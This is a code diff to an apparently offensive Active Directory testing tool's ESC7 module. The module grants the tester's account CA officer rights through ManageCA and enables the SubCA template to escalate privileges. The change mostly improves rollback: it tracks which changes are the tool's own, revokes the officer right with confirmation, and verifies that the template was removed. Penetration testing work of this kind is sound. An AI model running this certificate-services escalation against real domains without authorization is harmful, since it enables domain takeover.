@@ -10,10 +10,24 @@ from adscan_internal.services.adcs.cert_request import (
 from adscan_internal.services.adcs.cert_auth import CertAuthConfig, authenticate_with_cert_native
 from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
 from adscan_internal.services.adcs.esc_cleanup import (
-    esc_rollback_scope, register_ldap_change, mark_reverted, mark_revert_failed,
+    esc_revert_ldap_change, esc_revert_with_precedence, esc_rollback_scope,
+    register_ldap_change,
 )
 from adscan_internal.services.ldap_transport_service import ADscanLDAPConnection, ADscanLDAPConfig
-from adscan_internal.services.adcs.ca_admin import add_officer, remove_officer
+from adscan_internal.services.adcs.ca_admin import (
+    CA_RIGHT_MANAGE_CERTIFICATES,
+    _resolve_user_sid,
+    add_officer,
+    revoke_ca_right_confirmed,
+)
+from adscan_internal.services.cleanup_verification import (
+    VERIFY_CA_RIGHT,
+    VERIFY_CA_TEMPLATE_LIST,
+)
+from adscan_internal.services.cleanup_taxonomy import (
+    KIND_CA_OFFICER_ADDED,
+    MANUAL_CA_OFFICER,
+)
 
 _SUBCA_TEMPLATE = "SubCA"
 
@@ -100,6 +114,7 @@ async def run_esc7(config: EscConfig) -> EscResult:
 
         # Step 0: Add self as CA officer (grants ManageCertificates) — requires ManageCA.
         print_info(f"ESC7: adding {config.username!r} as officer on {config.ca_name}...")
+        officer_outcome: dict = {}
         ok_officer, err_officer = await asyncio.to_thread(
             add_officer,
             ca_host=config.ca_host,
@@ -109,29 +124,73 @@ async def run_esc7(config: EscConfig) -> EscResult:
             username=config.username,
             password=config.effective_secret or "",
             target_username=config.username,
+            outcome=officer_outcome,
         )
         if not ok_officer:
             return EscResult(
                 success=False, esc=7,
                 error=f"add-officer failed — ManageCA required: {err_officer}",
             )
+        # ``changed`` absent (an implementation that does not report it) keeps
+        # the historical behaviour: treat the grant as ADscan's own. False means
+        # the account was ALREADY an officer: not ADscan's change, so it is not
+        # recorded and is never removed.
+        officer_added = bool(officer_outcome.get("changed", True))
+        officer_change_id: Optional[str] = None
+        if officer_added:
+            officer_change_id = register_ldap_change(
+                config.shell, kind=KIND_CA_OFFICER_ADDED,
+                domain=config.domain, target=f"EnterpriseCA/{config.ca_name}",
+                detail={
+                    "ca_name": config.ca_name,
+                    "ca_host": config.ca_host,
+                    "trustee": config.username,
+                    "right": "ManageCertificates (officer)",
+                },
+                method="ADCSESC7: CA officer right granted through ManageCA",
+            )
 
         async def _remove_officer() -> None:
             nonlocal officer_removed
-            if officer_removed:
+            if officer_removed or not officer_added:
                 return
             officer_removed = True
             print_info(f"ESC7: removing {config.username!r} officer right from {config.ca_name}...")
-            await asyncio.to_thread(
-                remove_officer,
-                ca_host=config.ca_host,
-                ca_name=config.ca_name,
-                dc_ip=config.dc_ip,
-                domain=config.auth_domain,
-                username=config.username,
-                password=config.effective_secret or "",
-                target_username=config.username,
+            sid_hex = str(officer_outcome.get("target_sid_hex") or "")
+            if not sid_hex:
+                raw_sid = await asyncio.to_thread(
+                    _resolve_user_sid, config.dc_ip, config.auth_domain,
+                    config.username, config.effective_secret or "", config.username,
+                )
+                sid_hex = raw_sid.hex() if raw_sid else ""
+
+            def _revoke(candidate) -> tuple[bool, Optional[str]]:
+                if not sid_hex:
+                    return False, "the trustee's SID could not be resolved"
+                return revoke_ca_right_confirmed(
+                    smb_config=candidate.smb_config(
+                        target_ip=config.ca_host,
+                        target_hostname=config.ca_fqdn or config.ca_host,
+                        kdc_ip=config.dc_ip,
+                    ),
+                    ca_name=config.ca_name,
+                    target_sid_hex=sid_hex,
+                    right=CA_RIGHT_MANAGE_CERTIFICATES,
+                )
+
+            ok_rm = await asyncio.to_thread(
+                esc_revert_with_precedence,
+                config,
+                change_id=officer_change_id,
+                purpose=KIND_CA_OFFICER_ADDED,
+                revert_and_confirm=_revoke,
+                verification_method=VERIFY_CA_RIGHT,
+                manual_instructions=MANUAL_CA_OFFICER.replace("TARGET", str(config.username)),
+                object_dn=f"EnterpriseCA/{config.ca_name}",
+                description="CA officer right removal",
             )
+            if not ok_rm:
+                print_error("ESC7: failed to remove the officer right (manual cleanup required).")
 
         rb.add(_remove_officer)
 
@@ -145,19 +204,37 @@ async def run_esc7(config: EscConfig) -> EscResult:
             subca_reverted = True
             print_info(f"ESC7: removing SubCA from {config.ca_name} templates...")
 
-            def _do_disable() -> bool:
-                with ADscanLDAPConnection(cfg) as c2:
-                    return c2.modify(ca_dn, {"certificateTemplates": [("delete", [_SUBCA_TEMPLATE])]})
+            def _subca_absent(conn) -> bool:
+                conn.search(
+                    search_base=ca_dn,
+                    search_filter="(objectClass=*)",
+                    attributes=["certificateTemplates"],
+                    search_scope="BASE",
+                )
+                if not conn.entries:
+                    return False
+                raw = conn.entries[0].entry_raw_attributes.get("certificateTemplates") or []
+                names = {(v.decode() if isinstance(v, bytes) else str(v)).lower() for v in raw}
+                return _SUBCA_TEMPLATE.lower() not in names
 
-            ok = await asyncio.to_thread(_do_disable)
+            ok = await asyncio.to_thread(
+                esc_revert_ldap_change,
+                config,
+                change_id=change_id,
+                purpose="ca_template_enabled",
+                revert=lambda conn: bool(
+                    conn.modify(ca_dn, {"certificateTemplates": [("delete", [_SUBCA_TEMPLATE])]})
+                ),
+                verify=_subca_absent,
+                verification_method=VERIFY_CA_TEMPLATE_LIST,
+                manual_instructions=f"Manually remove SubCA from certificateTemplates on {ca_dn}",
+                object_dn=ca_dn,
+                description="SubCA template removal",
+                connect=lambda ldap_cfg: ADscanLDAPConnection(ldap_cfg),
+            )
             if ok:
-                mark_reverted(config.shell, change_id)
                 print_success("ESC7: SubCA template removed.")
             else:
-                mark_revert_failed(
-                    config.shell, change_id, error="LDAP modify failed",
-                    instructions=f"Manually remove SubCA from certificateTemplates on {ca_dn}",
-                )
                 print_error("ESC7: failed to remove SubCA (manual cleanup required).")
 
         rb.add(_disable_subca)
